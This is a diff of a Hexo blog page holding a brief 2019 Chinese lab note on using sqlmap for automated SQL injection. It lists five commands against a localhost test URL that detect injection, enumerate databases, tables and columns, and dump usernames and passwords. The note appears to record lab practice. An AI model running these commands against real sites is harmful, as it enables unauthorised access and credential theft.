@@ -10,12 +10,14 @@
 
     <!--Description-->
     
-        <meta name="description" content="title:  使用sqlmap实现自动注入攻击
-2019/07/21   实验笔记1、检测是否存在SQL注入
+        <meta name="description" content="2019/07/21   实验笔记1、检测是否存在SQL注入
 Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1
  
 2、爆库
-Sqlmap.py -u 127.0.0.1/sql/sql/union.php?">
+Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 –dbs
+ 
+3、爆表
+Sqlmap.p">
     
 
     <!--Author-->
@@ -25,7 +27,7 @@ Sqlmap.py -u 127.0.0.1/sql/sql/union.php?">
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="Hexo">
+        <meta property="og:title" content="2019/07/21实验笔记：使用sqlmap实现自动注入攻击">
     
 
     <!--Open Graph Description-->
@@ -36,7 +38,7 @@ Sqlmap.py -u 127.0.0.1/sql/sql/union.php?">
 
     <!--Type page-->
     
-        <meta property="og:type" content="website">
+        <meta property="og:type" content="article">
     
 
     <!--Page Cover-->
@@ -47,7 +49,7 @@ Sqlmap.py -u 127.0.0.1/sql/sql/union.php?">
 
     <!-- Title -->
     
-    <title>Hexo</title>
+    <title>2019/07/21实验笔记：使用sqlmap实现自动注入攻击 - Hexo</title>
 
     <!-- Tachyons Core CSS -->
     <link rel="stylesheet" href="https://unpkg.com/tachyons/css/tachyons.min.css">
@@ -130,7 +132,7 @@ Sqlmap.py -u 127.0.0.1/sql/sql/union.php?">
     <!-- Title -->
     <div class="w-100 mw8 center vh-40 dt">
         <div class="dtc v-mid white">
-            <h1 class="f1-l f2-m tc tc-m tl-ns">Untitled</h1>
+            <h1 class="f1-l f2-m tc tc-m tl-ns">2019/07/21实验笔记：使用sqlmap实现自动注入攻击</h1>
             <p class="f4 fw3 pab-100px tc tc-m tl-ns">2019-08-13</p>
         </div>
     </div>
@@ -149,22 +151,21 @@ Sqlmap.py -u 127.0.0.1/sql/sql/union.php?">
                             
                     <div class="w-100 mw7 fw3 lh-copy post-content">
                         <!-- Main Post Content -->
-                        <p>title:  使用sqlmap实现自动注入攻击</p>
-<h2 id="2019-07-21-实验笔记"><a href="#2019-07-21-实验笔记" class="headerlink" title="2019/07/21   实验笔记"></a>2019/07/21   实验笔记</h2><p>1、检测是否存在SQL注入</p>
+                        <h2 id="2019-07-21-实验笔记"><a href="#2019-07-21-实验笔记" class="headerlink" title="2019/07/21   实验笔记"></a>2019/07/21   实验笔记</h2><p>1、检测是否存在SQL注入</p>
 <p>Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1</p>
-<p><img src="file:///C:%5CUsers%5C%E7%B3%96%E7%B3%96%E7%B3%96%5CAppData%5CLocal%5CTemp%5Cksohtml10480%5Cwps1.jpg" alt="img"> </p>
+<p><img src="//wx1.sinaimg.cn/large/0078H38igy1g5xw959ijgj30fd0570u0.jpg" alt="img"> </p>
 <p>2、爆库</p>
 <p>Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 –dbs</p>
-<p><img src="file:///C:%5CUsers%5C%E7%B3%96%E7%B3%96%E7%B3%96%5CAppData%5CLocal%5CTemp%5Cksohtml10480%5Cwps2.jpg" alt="img"> </p>
+<p><img src="//wx1.sinaimg.cn/large/0078H38igy1g5xwa3l8lij30fe02dwer.jpg" alt="img"> </p>
 <p>3、爆表</p>
 <p>Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 -D test –tables</p>
-<p><img src="file:///C:%5CUsers%5C%E7%B3%96%E7%B3%96%E7%B3%96%5CAppData%5CLocal%5CTemp%5Cksohtml10480%5Cwps3.jpg" alt="img"> </p>
+<p><img src="//wx3.sinaimg.cn/large/0078H38igy1g5xwachb5ej30fe02laa8.jpg" alt="img"> </p>
 <p>4、爆字段</p>
 <p>Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 -D test -T user –colums</p>
-<p><img src="file:///C:%5CUsers%5C%E7%B3%96%E7%B3%96%E7%B3%96%5CAppData%5CLocal%5CTemp%5Cksohtml10480%5Cwps4.jpg" alt="img"> </p>
+<p><img src="//wx3.sinaimg.cn/large/0078H38igy1g5xwaoybf3j30fe02tjrp.jpg" alt="img"> </p>
 <p>5、爆数据</p>
 <p>Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 -D test -T user -C id,password,username –dump</p>
-<p><img src="file:///C:%5CUsers%5C%E7%B3%96%E7%B3%96%E7%B3%96%5CAppData%5CLocal%5CTemp%5Cksohtml10480%5Cwps5.jpg" alt="img"> </p>
+<p><img src="//ws1.sinaimg.cn/large/0078H38igy1g5xwaxm5wqj30fe02rwf0.jpg" alt="img"> </p>
 
                     </div>
                 
